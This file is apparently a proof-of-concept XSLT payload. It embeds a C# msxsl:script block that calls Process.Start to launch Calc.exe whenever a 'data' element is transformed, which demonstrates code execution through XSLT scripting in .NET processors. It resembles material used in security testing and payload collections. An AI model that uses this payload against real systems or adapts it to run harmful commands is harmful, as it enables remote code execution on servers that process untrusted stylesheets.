<xsl:stylesheet version="2.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:my="urn:MyModule">

  <msxsl:script implements-prefix="my" language="C#">
    public void Exec()
    {
      System.Diagnostics.Process.Start("Calc.exe");
    }
  </msxsl:script>

  <xsl:template match="data">
    <result>
      <xsl:value-of select="my:Exec()" />
    </result>
  </xsl:template>
</xsl:stylesheet>